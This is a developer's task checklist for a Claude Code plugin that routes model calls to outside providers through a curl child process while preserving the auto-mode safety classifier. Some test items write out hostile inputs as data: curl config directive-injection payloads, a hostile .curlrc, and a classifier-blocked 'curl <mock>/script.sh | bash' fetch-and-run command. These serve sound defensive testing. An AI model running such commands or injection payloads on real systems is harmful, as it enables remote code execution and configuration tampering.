- [x] write tests for the engine's own prefixed requests recorded in Task 2, each refused with no job pending: the classifier retry (`custom:x:y`, classifier keys), the prompt suggestion and the compaction request (conversation keys, `fallbacks`)
- [x] write tests for `shadowFetchFailed`: with `next.called` false and a job pending, a request that would match the predicate is refused; with `next.called` true it is replayed; a predicate function that throws leads to a refusal
- [x] write tests for the session flags: `routedSeen` after a routed step of any loop and never cleared by an unprefixed step; `stepSeen` after any step; both false after `resetShadow`
- [x] write tests for the reload rule: with `autoModeClassifier: false`, a classifier request is refused while `stepSeen` is false, and passes as ordinary traffic once only unprefixed steps were seen; with it `true`, it passes
- [x] write tests for `shadowFetchFailed` with no pending job and `autoModeClassifier: false`: an unforwarded engine request is refused with zero forwards when `routedSeen` or not `stepSeen`, also when the predicate function throws and when the hook overran its budget; the predicate is not called from `.catch`
- [x] add the `autoModeClassifier` option (`userConfig` boolean, default `true`) to `plugin.json` and `loadConfig`
- [x] implement the rule order of "Solution Overview" in `shadowFetch` and the stricter `.catch`
- [x] run tests, typecheck, validate - must pass before Task 6

### Task 6: The fetch-side handler (`answerShadow`) with the outbound guard

**Files:**
- Create: `hooks/answer.ts`, `hooks/answer.test.ts`
- Modify: `hooks/call.ts`, `hooks/call.test.ts`

Built and tested on its own; nothing calls it from the hooks yet.

- [x] write tests: create and continue bodies resolve, normalize and build as today; the provider's reply comes back as SSE (zero usage, the provider's model, a minted id) and the outcome is staged on the job with the real usage; the job's phase moves `captured` → `answered`
- [x] write tests for failures, each answered with the empty stub and a staged `error` outcome holding the `ErrorReply`: provider HTTP error; thrown fetch (on the fallback transport the host's `no complete answer within 30000ms` becomes the fallback-specific sentence of Task 7); unreadable reply; a reply whose stop reason the gate rejects; a missing or unrebuildable conversation (the clear error)
- [x] write tests for Esc: the signal aborting during the call gives the empty stub at once and a `cancelled` outcome; a signal already aborted at capture does the same without a provider call
- [x] write tests for the outbound guard, each answered locally with zero network calls: a routed model equal to `SHADOW_MODEL` (`custom:gw:provider-router-shadow`); a custom endpoint URL containing the shadow model's name; and one positive test: a conversation that merely quotes the name is sent
- [x] write tests that the step's system prompt and effective tools (after `tool_addition` / `tool_removal`) are kept on the loop when the handler captures the request, while the conversation and anchors are not
- [x] write tests for the timeout (`raceCall` in the handler, mechanism (a); `DEFAULT_TIMEOUT_MS` 570 s) and for job identity: a timeout gives the stub and an `error` outcome with the timed-out text; a late provider success and a late rejection after abandonment change nothing and reject nothing unhandled; a newer job on the same loop is untouched
- [x] implement `answerShadow(job, body, io)` and the changes to `call.ts` — as built: `answerShadow(job: AnswerJob, body, step: AnswerStep, io: AnswerIO): Promise<string>` (`step` = event, route, config, threads; `io.recovery` injects `recoveryFor`; outcome `reply` holds the whole `Reply` plus `messageId`); the handler sets `answered` then `handed` on return; `providerSend` and `guardFetch` exported for Task 8
- [x] run tests, typecheck, validate - must pass before Task 7

### Task 7: Provider transport through a `curl` child process

**Files:**
- Create: `hooks/transport.ts`, `hooks/transport.test.ts`, `scripts/probes/curl-transport.sh`
- Modify: `hooks/answer.ts`, `hooks/answer.test.ts`, `hooks/register.ts`, `hooks/providers-command.ts`, `hooks/providers-command.test.ts`, `hooks/secrets.test.ts`, `scripts/probes/README.md`, `docs/design-notes.md`
- ➕ As built, also: create `scripts/curl-integration.mts`; modify `hooks/shadow.ts`, `hooks/shadow.test.ts`, `hooks/call.ts`, `hooks/register.test.ts`, `package.json` (`npm test` runs the integration script), `CLAUDE.md`, `scripts/probes/mock-provider.py` (drop detection on `/slow`), `scripts/probes/probe-mod/probe.ts` (`PROBE_HOLD_SPAWN_URL`, `PROBE_SPAWN_RETURN_MS`), `scripts/probes/make-probe.sh` (anchor)

Why: the host ends any `$.http.fetch` at 30 s (Task 2), in `v0.1.2` too; a `curl` child held a provider call for 590 s in the spike. `curlFetch` has the adapters' `Fetch` signature, so the adapters do not change.

- [x] probe first, recorded as a row in `docs/design-notes.md` with a script in `scripts/probes/` (the slow endpoint is the mock provider's `/slow?s=<n>`, `scripts/probes/README.md`): from the `http.fetch` hook, `$.process.spawn` running `curl` against `/slow` for 60 s and for 300 s completes; ending the stream loop (`return()`) kills the child (the mock sees the connection drop); `next.signal` aborting kills it; the hook's budget is not consumed while it waits. GO for Task 7 only if all hold with `$.process.spawn`. If not: `$.process.run` with `timeoutMs` may be used only if the handler still answers the empty stub at once on Esc and timeout (the child is left to finish under its own `--max-time`, which the README states), and its output limits are then enforced from `isStdoutTruncated` / `isStderrTruncated` ("reply too large" on either), with runner-specific overflow tests for that runner; log a `[deviation]` — **GO (spawn)**, `scripts/probes/curl-transport.sh`, design-notes "Curl transport probe": 60 s and 300 s holds completed (`{code: 0}`, answer accepted); `return()` with a pull pending settled it `done` and the mock saw the drop at 20.1 s; Esc aborted `next.signal`, the pull rejected and the mock saw the drop at 8.7 s; `next.budget.remainingMs` stayed at about 9997 of 10000. No fallback to `$.process.run`
- [x] the child's lifetime is owned in one place: `curlFetch` takes the job's signal and ends the stream loop on timeout, on Esc, on abandonment, and on a size overflow; write a test per case with an injected spawn that records `return()` and asserts the child was ended, plus one connection-drop test against the mock
- [x] write tests for the argv and the config: argv is exactly `curl`, `--disable`, `--config`, `-` (`--disable` first so no `.curlrc` is read: no trace file, no extra options from the user's config); the config on stdin holds `url`, one `header` per header, `data-binary`, `silent`, `show-error`, `globoff`, `proto = "=https,http"`, `max-redirs = 0` (no redirects), `max-time` from the timeout, and a `write-out` that appends the status after a separator. No key, URL, header or body is in argv
- [x] one config-string encoder for every value, with tests: `"` and `\` escaped, `\n` / `\t` / `\r` escaped in the body; header names must match the HTTP token grammar and header values and the URL must not contain CR, LF or NUL (rejected before curl starts, with a clear error); the URL must be `http` or `https` and parse; directive-injection payloads (`"\nurl = "...`, `"\noutput = ...`, a value ending in `\`) cannot add a config line. Run these against a real `curl` too (an integration test that is skipped when `curl` is absent) — as built: `scripts/curl-integration.mts` under Node (the test kit has no process noun), run by `npm test`
- [x] size limits, with tests: stdout and stderr are each capped while reading, by UTF-8 bytes (4 MiB, the same as `$.process.run`); on overflow the loop ends, the child is killed, and the error is "reply too large"; the escaped `data-binary` line must stay under curl's config line limit (10 MB, measured after escaping): a body that exceeds it is an error before curl starts (test with a body whose escaping doubles its size)
- [x] a hostile `.curlrc` test: with `CURL_HOME` / `HOME` pointing at a temp dir whose `.curlrc` sets `trace-ascii` to a file and `proxy` to a dead address, a call with a fake key succeeds against the mock and the trace file does not exist
- [x] write tests for failures: `curl` exiting non-zero with a connection error gives a thrown error with curl's stderr text, redacted (`hooks/errors.ts` `redact`); a missing status separator gives an unreadable-reply error
- [x] write tests for selection: `curlFetch` is used when `curl --version` runs (checked once per module load, cached); when it cannot be started the transport is `$.http.fetch` and `/providers` says `transport: fetch (30 s limit)`; with curl it says `transport: curl`. Fallback happens only on a confirmed start failure before anything was sent (the `--version` check failing, or the child failing to start); a curl failure after the request may have been sent is an error reply, never a retry through `$.http.fetch`. A test asserts the fallback-specific error text when a fallback call hits the host's 30 s limit (`... the reply took longer than 30 s, the limit without curl ...`)
- [x] extend `hooks/secrets.test.ts`: no key appears in argv, in an error text, or in any `/providers` output, for every provider row
- [x] wire the handler's `io.fetch` in `register.ts` to the selected transport (the `http.fetch` hook passes `$.process.spawn` / `$.process.run` through a top-level function, as the hooks module checker requires) — as built: `fetchSide($, next.signal, ...)` in `register.ts`, handed to the handler through a new optional `side` factory of `shadowFetch` (`ShadowHandler(body, side?)`, `FetchSide` in `call.ts`); today's `routedStep` keeps `$.http.fetch` until Task 8
- [x] run tests, typecheck, validate - must pass before Task 8

### Task 8: `routedStep` drives the engine's stream; delivery decision

**Files:**
- Modify: `hooks/register.ts`, `hooks/register.test.ts`, `hooks/thread.test.ts`, `tests/harness.ts`
- ➕ As built, also: `hooks/shadow.ts`, `hooks/shadow.test.ts` (`openShadow` / `closeShadow` carry the breaker for the step side, `shadowStep` now wraps them; `latestJob` lets a late continuation leave a newer job's loop state alone), `hooks/providers/anthropic.test.ts`, `hooks/providers/openai.test.ts` (a now-vacuous stub-chunk assertion replaced by one on the SSE answer). The harness engine reads its answer as Claude Code does (`engineReads`). Until Task 10 the step's returned result carries the provider's real usage (as `v0.1.2`), so `recordUsage` and compaction keep working

- [x] write tests for the new `routedStep`: it registers a job with the handler, yields the engine's chunks unchanged, returns the engine's result, and ends the job in `finally`; for an `error` outcome it yields none of the stub's chunks, then `errorChunks`, and returns their result; for a `cancelled` outcome it yields nothing and returns the cancelled result; an early failure (missing key, unknown endpoint) still answers without calling `next`
- [x] write one test per row of the "Delivery decision" table
- [x] port the thread-invariant tests in `hooks/thread.test.ts` to the new flow: error step recorded with its text; Esc before delivery records nothing; delivery cut short drops the conversation and keeps system and tools; failure before capture drops it; an interrupted first create; an interrupted step with tool additions and removals; an iterator left suspended, not only closed; anchors kept per step
- [x] write tests for abandonment: the fetch-side handler lingering after the step's dispatch ended; a timeout followed at once by a new step on the loop; the dispatch's signal aborting while the generator stays suspended (no `.return()`): the job is removed by the listener, the next step on the loop can start, and the old continuation cannot touch the new job; listeners and timers are gone after a job settles
- [x] implement the new `routedStep` and wire the `http.fetch` hook to give the handler the transport selected in Task 7 (curl; `$.http.fetch` only as the fallback) and its own `$.clock.sleep`; a test asserts the curl transport is the one the handler receives when curl is available
- [x] keep the outer guarantees: the `turn.step` hook's try/catch and `.catch` still turn any failure into a local reply; a prefixed model never reaches the engine with its own id
- [x] run tests, typecheck, validate - must pass before Task 9

### Task 9: Remove what the new flow no longer uses

**Files:**
- Modify: `hooks/shadow.ts`, `hooks/shadow.test.ts`, `hooks/chunks.ts`, `hooks/chunks.test.ts`, `hooks/errors.ts`, `hooks/errors.test.ts`

- [x] remove the `shadowStep` wrapper if nothing calls it; the empty stub stays (errors and Esc use it), also as the defensive answer for a job with no outcome
- [x] remove `toChunks` / `toResult` if nothing calls them; keep `errorChunks` (every error reply, and failures before `next`)
- [x] update or remove the tests of what was removed; add a test that the public surface each module still exports is used
- ➕ As built: `shadowStep` removed (its tests drive the open/close pair through a test-local helper); `toResult` removed with its tests; `toChunks` kept because `scripts/probes/probe-mod/probe.ts` (built by `make-probe.sh`) imports it; `sessionFlags` kept as the test observer of the opt-out flags; each of `shadow.ts`, `chunks.ts`, `errors.ts` pins its runtime exports in its test
- [x] run tests, typecheck, validate - must pass before Task 10

### Task 10: Usage, compaction and `/providers`

**Files:**
- Modify: `hooks/register.ts`, `hooks/context.ts`, `hooks/context.test.ts`, `hooks/providers-command.ts`, `hooks/providers-command.test.ts`
- ➕ As built: `routedStep` takes the loop's usage record as an optional 7th argument and records the reply's real usage there after a delivered step; the returned result keeps the engine's zeros (so `/cost` and the engine's own compaction see no invented usage). `context.ts` is unchanged. `shadow.ts` counts `classifierPassed` / `classifierRefused` where rule 3 decides (no decision changed); `/providers` shows `autoModeClassifier: on|off` and `classifier requests: passed N, refused M`. Also updated: `hooks/shadow.test.ts`, `hooks/providers/anthropic.test.ts`, `hooks/providers/openai.test.ts` (result usage and `shadowStats` shape)

- [x] write tests: a recorded step's real usage (from the job, not the engine's zeroed result) reaches `recordUsage`; an error step keeps the previous record; a dropped step records none
- [x] write a test that the mod's own compaction scheduling is unchanged (Task 2: kept; with zero usage in the SSE the engine never starts its own)
- [x] write a test that `/providers` shows `autoModeClassifier`, a count of classifier requests passed and refused, and the existing counters
- [x] implement the usage hand-off, the compaction change and the `/providers` lines
- [x] run tests, typecheck, validate - must pass before Task 11

### Task 11: Local auto-mode check and smoke test update

**Files:**
- Create: `scripts/automode-check.sh`
- Modify: `scripts/probes/mock-provider.py`, `scripts/probes/README.md`, `scripts/probes/check-predicate.py`, `tests/observer-plugin/hooks/register.ts`, `tests/observer-plugin/README.md` (create if absent), `scripts/smoke.sh`, `package.json`

- [x] `scripts/probes/mock-provider.py` (exists since Task 2, shared by the probes and the check): scenarios `agent`, `bash`, `cmd`, the `MOCKWORKER` subagent; extend only if the check needs it — extended: the `MOCKWORKER` Bash call is `touch <marker>; echo MOCK-WORKER-RAN`, so the tool result shows the command ran even when the OS sandbox stops the write
- [x] extend `tests/observer-plugin/hooks/register.ts`: record the `anthropic-beta` header's classifier token (only a token matching `^auto-mode-classifier-\d{4}-\d{2}-\d{2}$`, never other header values) and the `x-claude-code-agent-id` presence, so the predicate can be checked from the record; update its README and the record schema check in `scripts/probes/check-predicate.py` — as built: field `classifierBeta` (token or `null`); `check-predicate.py --observer [--provider-host <host:port>]` checks the schema (exit 2: a header value, a beta token other than the classifier's, a missing field) and prints one JSON line per request with its kind (`provider`, `classifier`, `telemetry`, `engine-other`, `other`), the predicate conditions it fails, and whether it names the shadow model or a prefixed id
- [x] `scripts/automode-check.sh`, routed main session in auto mode: `Agent` ran; the observer's record (observer loaded after the router) holds only the provider's host, telemetry, and classifier requests that satisfy the predicate (`scripts/probes/check-predicate.py` logic on the observer's fields); no request names the shadow model or a prefixed id
- [x] same script, subscription main session with a routed subagent in auto mode: the subagent's Bash call was judged (a classifier request ended `outcome=ok` and the tool result is the command's own output; in `-p` the OS sandbox may still stop the write, so the marker file is not the assertion)
- [x] same script, a call the classifier blocks (`curl <mock>/script.sh | bash`): the mock saw no GET and the model received the classifier's denial
- [x] same script, `autoModeClassifier: false`: the call is refused and the observer's record holds no classifier request
- [x] same script: provider calls go through curl, which the observer cannot see, so the mock provider's own log is collected and asserted: one request per routed step, none naming the shadow model, every one with the expected model
- [x] update `scripts/smoke.sh` to Task 2's findings: usage still lists only a zero-cost shadow entry; transcript rows of routed steps name the provider's model and a `msg_pr_*` id; an error case still shows the `[provider-router]` text; add `npm run automode`
- [x] run `scripts/automode-check.sh` - must pass before Task 12 — passed 4/4 (main-agent, sub-bash, blocked, optout); 7 classifier requests sent
- ➕ As built: each `claude -p` runs with `--setting-sources project,local`: the first run's `blocked` case was settled by the user's own PreToolUse hook (`permissionDecision: allow`) before the classifier, so the command ran (inside the temp dir, stopped by the sandbox); user settings are not loaded, never modified. Routed steps are counted from the stream plus the session's transcripts (the stream leaves out some steps of a foreground subagent): mock calls must equal distinct `msg_pr_*` ids, each naming `mock-model-1`. In `smoke.sh` routed steps are asserted by `msg_pr_*` id and a provider model name with no router prefix (provider names vary, e.g. dated suffixes), plus `transport: curl` in `/providers`, no usage entry under a routed main session's own id, and no `msg_pr_*` step in the error case

### Task 12: Verify acceptance criteria

- [x] auto mode, routed main session: `Agent` runs (automode check) — `scripts/automode-check.sh` (1310b1d) case `main-agent` PASS on Claude Code 2.1.325: `Agent` judged by the local classifier and ran, 0 denials
- [x] auto mode, subscription main session, routed subagent: its unsettled Bash call is judged, not refused for lack of a verdict — automode case `sub-bash` PASS: `classifier_request_finished tool=Bash outcome=ok`, tool result is the command's own output (`MOCK-WORKER-RAN`)
- [x] a blocked call does not execute — automode case `blocked` PASS: `curl <mock>/script.sh | bash` denied in both classifier stages, the mock logged no GET, no file in `outside`
- [x] a routed reply that takes 60 s (the mock with a delay) is delivered through the `curl` transport; with `curl` made unavailable (a `PATH` without it) the same step fails with the 30 s fallback message — live, 2026-11-15, `-p --permission-mode default`, `scenario=slow:60`: result `MOCK-SLOW` after 60219 ms, debug `$.process.spawn (provider-router): curl ended (0) in 60026ms`; with a PATH of symlinks minus `curl`: `curl failed to start: ENOENT`, then `$.http.fetch (provider-router): POST ...`, result after 30191 ms `[provider-router] custom:mock error: request failed: the reply took longer than 30 s, the limit without curl (...)`, `/providers` shows `transport: fetch (30 s limit)` (with curl: `transport: curl`); `docs/design-notes.md` "Answer in place: acceptance runs"
- [x] the observer cannot see `curl` traffic (it is a child process, not `$.http.fetch`): the mock provider's own log is the record of provider calls, and no request reached it that names the shadow model — automode `common()` asserts on the mock's log in all 4 cases (one call per `msg_pr_*` step, every one model `m`, none naming `provider-router-shadow`); the Task 12 runs' mock logs likewise hold only `model: m`
- [x] default and accept-edits modes behave as in `v0.1.2` — live, 2026-11-16, `S=agent` and `S=bash` in `default` and `acceptEdits`, HEAD vs `git archive v0.1.2`: identical results in all 8 runs (`Agent` launched, PONG subagent answered, `MOCK-DONE`; the outside `touch` refused `needs approval`), 0 classifier requests; HEAD's provider calls went through the curl child
- [x] by the observer's record: no shadow request and no prefixed model id reached the first-party host in any run, and the only first-party requests carrying a routed loop's conversation are classifier requests that satisfy the predicate (the accepted classifier payload; ordinary requests of subscription-model loops, including a subscription main session and a switch back to a subscription model, are expected and allowed; an interactive run included: it sends the prompt-suggestion request, which must be refused) — automode check: no `names_shadow`/`prefixed` request in the 4 cases, only provider, telemetry and predicate-satisfying classifier requests in the routed cases; interactive pty run (default, two prompts, observer beneath the router): debug `source=prompt_suggestion` → `API hook_denied: provider-router: shadow request refused locally`; the observer holds 2 telemetry requests and the session-title request (`claude-haiku-5-5`, engine, sent at prompt submit before the step; carries the prompt, not the routed loop's replies, as in `v0.1.2`), nothing named the shadow model or `custom:mock:m`
- [x] no secret in any output (`hooks/secrets.test.ts` passes) — `npm test`: `hooks/secrets.test.ts` all pass (incl. the XAI_API_KEY child-env case added in 7855ec9)
- [x] run `npm test`, `npm run typecheck`, `npm run validate` - all pass — `533 pass, 0 fail` + `curl-integration: all passed`; `tsc` exit 0; `✔ Validation passed with warnings` (TS5097 and ICON_MISSING only)
- [x] run `code-reviewer` on the branch, fix findings with `review-fixer`, re-review (max 3 rounds) — round 1: two reviewers "approve with changes", one minor finding each, fixed in 7855ec9 and 82a99e5; re-review of 1310b1d..82a99e5 approved with no findings

### Task 13: Documentation

**Files:**
- Modify: `README.md`, `CLAUDE.md`, `docs/design-notes.md`

- [x] README "How it works": the new flow diagram
- [x] README Limits: replace the auto-mode limitation with what now holds: auto mode works; the classifier runs on the subscription and sees the session's prompts and tool calls; the session classifies locally from the first routed step on, subscription loops included; the `autoModeClassifier` opt-out applies to the whole session, and right after a reload with it set a classifier request can be refused once; not behind `ANTHROPIC_BASE_URL`; provider calls go through `curl` (a reply may take up to 570 s); without `curl` the plugin falls back to `$.http.fetch`, where a reply must arrive within 30 s (the host's limit, which `v0.1.2` also has); routed replies are still not streamed
- [x] README: correct "Your subscription is never routed and never pays for a routed call" to state the classifier exception exactly
- [x] README Troubleshooting: the no-verdict row now points at `autoModeClassifier: false` or an old plugin version
- [x] `CLAUDE.md`: the fail-closed list gains the outbound guard, the prefixed-id rule, the classifier predicate with its stated residual, and the strict `.catch`; the thread-invariant wording follows the delivery table
- [x] `docs/design-notes.md`: "The shadow step" rewritten for answer in place; the spike tables kept, each pointing at the probe in `scripts/probes/` that reproduces it
- [x] `CLAUDE.md` Commands: `scripts/automode-check.sh` and the probes, with the note to re-run them after a Claude Code release
- [ ] move this plan to `docs/plans/completed/`

## Post-Completion
*Items requiring manual intervention or external systems - no checkboxes, informational only*

**Manual verification** (interactive session, a person at the keyboard):
- auto mode with a routed Fable main session dispatching `cto`: the subagent starts and can run commands
- Esc during a long routed step ends it and the next step continues correctly
- a `/config` change that sets `autoModeClassifier` to `false` in the middle of a routed auto-mode session (the reload Task 2 could not trigger): the next tool call is refused, nothing reaches the first-party host
- `/compact`, and `/model` to a subscription model and back, in a routed session
- `/rewind` and automatic compaction in a routed auto-mode session
- the notice Claude Code shows when auto mode falls back to billed classifier requests

**Release** (only with the user's go-ahead):
- bump to `0.2.0`, merge to `main`, tag, push, run Trivy on `main`
- update the plugin entry in the `oleggohman/cc-things` marketplace
